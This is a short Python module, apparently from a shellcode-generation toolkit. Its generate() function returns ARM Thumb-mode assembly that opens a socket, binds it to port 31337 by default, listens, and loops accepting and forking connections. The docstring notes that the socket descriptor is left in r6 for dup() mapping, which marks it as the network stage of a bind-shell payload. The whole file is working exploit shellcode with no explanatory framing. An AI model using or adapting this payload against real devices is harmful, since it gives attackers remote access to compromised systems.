import socket

def generate(port=31337):
    """accept loop shellcode in Thumb Mode
    
    Args:
        port(int/str): specific port

    Returns:
        ``r6`` reg indicates socket descriptor will be mapped with dup()
    """

    sc = '''
    /* socket(...) */
    movs r0, #2
    movs r1, #1
    subs r2, r2, r2
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #26
    svc 1

    /* bind(...) */
    mov r6, r0
    mov r4, pc
    adds r4, #22
    ldr r1, [r4]
    subs r2, r2, r2
    push { r1, r2 }
    mov r0, r6
    mov r1, sp
    movs r2, #16
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #27
    svc 1

    b after_sockaddr_in_5

sockaddr_in_1:
    .short 2
    .short %s

    /* listen(...) */
after_sockaddr_in_5:
    movs r1, #16
    mov r0, r6
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #29
    svc 1

    /* accept(...) */
looplabel_2:
    mov r0, r6
    subs r1, r1, r1
    subs r2, r2, r2
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #30
    svc 1
    /* fork(...) */
    mov r5, r0
    movs r7, #2
    svc 1
    cmp r0, #0
    bgt cleanup_3

    /* child close(...) */
    mov r0, r6
    movs r7, #6
    svc 1

    mov r0, r5
    b after_fork_4

    /* parent close() */
cleanup_3:
    mov r0, r5
    movs r7, #6
    svc 1

    b looplabel_2

after_fork_4:
    ''' % (socket.ntohs(port))
    return sc
